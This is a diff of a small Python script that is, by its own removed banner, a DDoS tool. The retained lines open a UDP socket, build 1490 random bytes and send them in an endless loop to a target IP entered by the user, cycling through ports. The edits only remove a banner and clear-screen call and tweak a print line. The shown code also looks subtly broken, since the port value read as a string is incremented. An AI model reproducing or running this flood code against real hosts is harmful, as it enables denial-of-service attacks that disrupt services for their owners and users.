@@ -3,7 +3,7 @@ import os
 import time
 import socket
 import random
-# Code Time
+
 from datetime import datetime
 
 now = datetime.now()
@@ -17,9 +17,6 @@ year = now.year
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
-
-os.system("clear")
-os.system("figlet DDos Attack")
 
 ip = input("IP Target : ")
 port = input("Port       : ")
@@ -41,6 +38,6 @@ while True:
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
     port = port + 1
-    print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
+    print("Sent %s packet to %s throught port:%s" % (sent, ip, int(port)))
     if port == 65534:
         port = 1
